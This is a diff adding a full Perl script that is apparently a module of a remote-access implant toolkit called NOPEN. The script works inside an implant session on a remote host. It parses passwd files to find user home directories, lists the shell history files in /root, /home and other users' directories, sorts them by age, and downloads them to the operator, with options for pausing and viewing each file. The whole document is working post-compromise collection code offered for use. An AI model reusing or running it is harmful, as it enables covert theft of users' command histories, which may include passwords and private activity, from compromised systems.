@@ -1,0 +1,323 @@
+#!/usr/bin/env perl
+##
+$VER="1.1.1.6" ;
+
+# This can be called either via its gs.auto* script or via a require
+# statement in another auto* script already in play. That script must
+# set @ARGV and already have the $socket open to a NOPEN client's autoport.
+# 
+# NOTE THOUGH:  After one require (say of this script), another one of another
+#               similarly equipped script really confuses things...local data
+#               is not so local.
+
+# nopen seems happier with stderr in lsh runs
+#select STDERR ;
+$| = 1 ;
+myinit() ;
+unlink("$optmp/.historiesout");
+#($output,$nopenlines,@output) = doit("");
+($output,$nopenlines,@output) = nopenlss("-UQ",$hardhomedirs,$homedirs);
+my @moredo=();
+my $v="";
+$v = " -v " unless $skipgets ; # pop up window when getting first several
+my (%skipoutput,$skipoutput)=();
+# $spaces must be space-dots since echo squishes multiple spaces into one.
+my $spaces = " . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . ";
+my ($numviewed,%doneit,$thereyet,$matchline) = (0);
+# If @output contains duplicate lines (say we did -ls / / ) this eliminates them.
+@output = uniqify_array(@output);
+if ($pastemethod) {
+  my @slimoutput =();
+  foreach (@output) {
+    my ($perms,$num,$user,$group,$size,$monstr,$mday,$hm,$y,$file) = split;
+    my $line = sprintf('%-10s %-10s %8d %3s %2d %5s %4d %-27s',
+		       $user,$group,$size,$monstr,$mday,$hm,$y,$file);
+dbg("    my ($perms,$num,$user,$group,$size,$monstr,$mday,$hm,$y,$file) = split;\n".
+    "line=$line=");
+    push (@slimoutput,$line);
+  }
+  my $prompt = 
+    join("\n",@slimoutput)."\n\n\n".
+    "Choose the oldest history file above which you want, triple-click that line and\n".
+    "paste it here. $prog will then get it and all those more recent.\n\n".
+    "(Enter nothing to get them all, or \"ABORT\" to abort.)\n\n".
+    "Choose: ";
+#  $prompt =~ s/ +/ /g;
+  ($ans,$matchline) = mygetinput($prompt);
+  chomp($matchline);
+  mydie("User aborted") if ($matchline eq "ABORT");
+  $matchline =~ s/ +/ /g;
+  $matchline =~ s/\s+$//;
+}
+foreach (@output) {
+  my ($type,$length) = /^(.)\S*\s*\S*\s*\S*\s*\S*\s*(\d*)/ ;
+  ($file) = /:\d\d\s+\d{4} (\/.*)/ ;
+  next if $doneit{$file}++;
+  my $space = " ";
+  $space = "" if length($file) % 2 ;
+  my $tab = substr($spaces,0,38-length($file.$space));
+  my ($stampsecs,$monstr,$mday,$hr,$min,$year) = epochseconds($_);
+  if ($cutofftime) {
+#dbg("(stampsecs,monstr,mday,hr,min,year)=($stampsecs,$monstr,$mday,$hr,$min,$year)");
+    if ($stampsecs < $cutofftime) {
+      my $more = sprintf(" . $file$space$tab(too old--$monstr %02d $hr:$min $year)\n",$mday);
+      $skipoutput{$stampsecs} .= $more;
+      next;
+    }
+  } elsif ($pastemethod and !$thereyet) {
+    my $thisline = $_;
+    chomp($thisline);
+    $thisline =~ s/ +/ /g;
+dbg("Comparing =$thisline=$matchline=");
+    next unless $thisline =~ /$matchline$/;
+    $thereyet++;
+  }
+  next unless $type eq "-" ; # skip links/dirs/etc
+  if ($maxlength and $length > $maxlength) {
+    $skipoutput{$stampsecs} .= " . $file$space$tab(too long, $length > $maxlength)\n";
+    next ;
+  }
+  if ($v and $maxviewed <= $numviewed) {
+    progprint("Only popping up first $maxviewed windows...just downloading the rest",$COLOR_FAILURE);
+    $v = "" ;
+  }
+  unless ($gotfile{$file}++) {
+    $numviewed++ ;
+    push(@moredo,"-get$v $file");
+  }
+}#foreach @output
+# Now sort %skipoutput
+foreach (sort by_num keys %skipoutput) {
+  $skipoutput .= $skipoutput{$_};
+}
+progprint("Skipping these files (newest shown last):\n$COLOR_FAILURE\n$skipoutput")
+  if $skipoutput;
+unless ($skipgets) {
+  if (@moredo) {
+    $viewnomore = 0;
+    my $abort = pauseit("Above is the sorted list of histories in $homedirs") ;
+    unless ($abort) {
+      while (@moredo) {
+	$cmd = shift(@moredo);
+	my ($file) = $cmd =~/(\/.*)/;
+	my ($viewit) = $cmd =~ s/( -v )/ /;
+	$viewit=0 if $viewnomore;
+	my ($output,$nopenlines,@output) = doit($cmd);
+	my ($localfile) = $output =~ / -. (\/.*)[\r\n]*/ ;
+	filepopup($localfile,"gotoend") if $viewit;
+	last unless @moredo;
+	last if pauseit("Just got $file");
+      }
+    }
+  } else {
+    if ($pastemethod) {
+      dolocalecho("\n${COLOR_FAILURE}\n".
+		  "Above${COLOR_NORMAL} is the sorted list of histories in $homedirs,\n\n".
+		  "${COLOR_FAILURE}BUT NONE NEWER THAN YOUR CHOICE IS A FILE".
+		  "${COLOR_NORMAL}\n"
+		 );
+    } else {
+      dolocalecho("\n${COLOR_FAILURE}\n".
+		  "Above${COLOR_NORMAL} is the sorted list of histories in $homedirs,\n\n".
+		  "${COLOR_FAILURE}BUT NONE IS UNDER ${COLOR_FAILURE}$hoursold HOURS OLD".
+		  "${COLOR_NORMAL}\n"
+		 );
+    }
+  }
+}
+# End with true value as we require this script elsewhere.
+1;
+
+sub pauseit {
+  return unless $pausing;
+  my ($ans) = mygetinput("$_[0]\n\n".
+			 "Choose one (single lowercase letter is fine):\n".
+			 "\n".
+			 "     c)ontinue,\n".
+			 "     d)o remaining history pulls with no prompts,\n".
+			 "     p)roceed with remaining history pulls with no further prompt AND without popping any up, or\n".
+			 "     a)bort remaining history pulls\n".
+			 "\n".
+			 "(choose one of c/p/d/a)","C","P","D","A");
+  $pausing=0 if ($ans eq "p" or $ans eq "d");
+  $viewnomore=1 if ($ans eq "p");
+  return 1 if ($ans eq "a");
+  return 0;
+}#pauseit
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs histories @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs histories" ;
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless $nopen_rhostname;
+  }
+  clearallopts();
+  mydie("bad option(s)") if (! Getopts( "hvl:LRpa:m:xP" ) ) ;
+  $pause = "# ";
+  $pausing = $opt_p ;
+  my $remove = "@ARGV" ;
+  $gsoptions =~ s/$remove// ;
+  $fromsurvey=0;
+  foreach (@ARGV) {
+    if (/fromsurvey/) {
+      $fromsurvey=1;
+      next;
+    }
+  }
+  $hardhomedirs = " /.*history /root/.*history /home/*/.*history " ;
+  $hardhomedirsonly = " / /root /home/* " ;
+  
+  # Defaults
+  # how old to look back
+  $defhoursold = 240 ;
+  # How long to retrieve in bytes
+  $defmaxlength = 100000 ;
+  # How many to popup
+  $defmaxviewed = 20 ;
+  
+  # look where for histories
+  $homedirfile = "$optmp/homedirs.$nopen_rhostname" ;
+  if (! -e "$homedirfile" or $opt_R) {
+    # Parse all retrieved passwd files for user dirs, then save them to disk
+    # and read them back.
+    my ($userlist,@dodirs) = parseuserdirs($nopen_rhostname,2000,"autohistories");
+    if (open(OUT2,"> $homedirfile")) {
+      print OUT2 "@dodirs\n";
+      close(OUT2);
+    } else {
+      mydie("Unable to open > $homedirfile");
+    }
+  }
+  mydie("Unable to open < $homedirfile") unless (open(IN2,"< $homedirfile")) ;
+  chomp($homedirs = <IN2>) ;
+  close(IN2) ;
+  @dodirs = uniqify_array (split(/\s+/,$homedirs));
+
+  $homedirs = " " ;
+  $homedirsonly = " " ;
+  foreach (@dodirs) {
+    $homedirs .= "$_/.*history " unless (/^\/dev/ or "$hardhomedirs$homedirs" =~ / $_\/.*history /) ;
+    $homedirsonly .= "$_ " unless (/^\/dev/ or "$hardhomedirsonly$homedirsonly" =~ / $_ /) ;
+  }
+  $homedirs =~ s/  / /g ;
+  $homedirs =~ s/^\s*(.*)\s*$/\1/g ;
+  $homedirs =~ s/\/\//\//g ;
+  $homedirsonly =~ s/  / /g ;
+  $homedirsonly =~ s/^\s*(.*)\s*$/\1/g ;
+  $homedirsonly =~ s/\/\//\//g ;
+  if (open(OUT2,"> $homedirfile")) {
+    print OUT2 "$homedirsonly\n";
+    close(OUT2);
+  } else {
+    mydie("Unable to open > $homedirfile second time");
+  }
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="Usage: $prog [options] [ dir [dir2] ... ]
+
+NOTE: $prog can take quite a while when the passwd file is large.
+
+$prog lists all \".*history\" files in user directories, sorted
+by time, then retrieves any under $defhoursold (or -a#) hours old. With
+the options below, the user can pause between and/or pop up each file.
+
+The directories examined always include $defhomedirs and will
+also include any other directory locations found in the system's
+/etc/passwd file already retrieved. If a \"dir\" is provided (must start
+with \"/\") it is also searched (this time and in future uses of
+autohistories for this host). Currently for $nopen_rhostname, these
+directories will be searched for \".*history\" files:
+
+           $hardhomedirsonly $homedirsonly
+
+OPTIONS
+
+  -h       show this usage statement
+  -a #     files less than this many hours old are retrieved [$defhoursold]
+           (use 0 to get all)
+  -P       you are shown all histories, you choose oldest one you want
+  -l #     maximum length of file to retrieve [$defmaxlength]
+           (use 0 to get any length)
+  -x       pops up the first several files retrieved (see -m) in separate
+           windows (at bottom of file) [default does not]
+  -m #     maximum number of retrieved files to pop-up [$defmaxviewed]
+  -p       pause between each history's -get -v [default does not]
+  -L       does NOT \"-get -v\" any of the files - only shows listing
+  -R       reset home directories for this host to: $defhomedirs
+
+";
+  usage() if ($opt_h or $opt_v) ;
+  # how old histories
+  $hoursold = $defhoursold ;
+  $hoursold = int($opt_a) if (defined $opt_a and $opt_a >= 0 and ($opt_a == int($opt_a))) ;
+  $pastemethod = $opt_P;
+  mydie("-a and -P cannot be used together") if $opt_a and $opt_P;
+  # Get timezone offset if we can (and want to)
+  if ($opt_a and -e "$opdown/hostinfo.$nopen_rhostname") {
+    my $oldone = $hoursold;
+    if (open(IN2,"<$opdown/hostinfo.$nopen_rhostname")) {
+      while (<IN2>) {
+	next unless /^Box Offset: (.*)/ ;
+	# Val here is in minutes
+	$val = $1 ;
+	$sign = 1 ;
+	if ($val < 0) {
+	  $val = -1 * $val ;
+	  $sign = -1 ;
+	}
+#print "DBG: $sign ... $_ ... $val  ".$val%60;
+	$hoursold -= $sign * int($val / 60) ;
+#dbg("oldone=$oldone sign=$sign val=$val Found in hostinfo.$nopen_rhostname:$_");
+	last;
+      }
+      close(IN2) ;
+      $hoursold = $oldone if $hoursold < 0;
+    }
+  }
+  # $cutofftime in epoch seconds
+  $cutofftime = 0 ;
+  if ($opt_a) {
+    $cutofftime = Time::Local::timegm(gmtime()) ;
+    # TODO: This is using local time
+    # change it to use GMT but also to offset the cutofftime based on 
+    # they guys time info in hostinfo*
+    $cutofftime -= $hoursold * 60 * 60 ; # subtract N hours (in seconds)
+  }
+
+  #dbg("hoursold=$hoursold cutofftime=$cutofftime gmtime()=".Time::Local::timegm(gmtime()) );
+  # how many lines per file
+  $maxlength = $defmaxlength ;
+  $maxlength = $opt_l if (defined $opt_l and $opt_l >= 0 and ($opt_l == int($opt_l))) ;
+  $maxviewed = $defmaxviewed ;
+  $maxviewed = $opt_m if (defined $opt_m and $opt_m >= 0 and ($opt_m == int($opt_m))) ;
+  $maxviewed = 0 unless $opt_x;
+  $skipgets = 1 if $opt_L ;
+  %nummon = (Jan, "00", Feb, "01", Mar, "02", Apr, "03",
+	     May, "04", Jun, "05", Jul, "06", Aug, "07",
+	     Sep, "08", Oct, "09", Nov, "10", Dec, "11",);
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+} #myinit
+
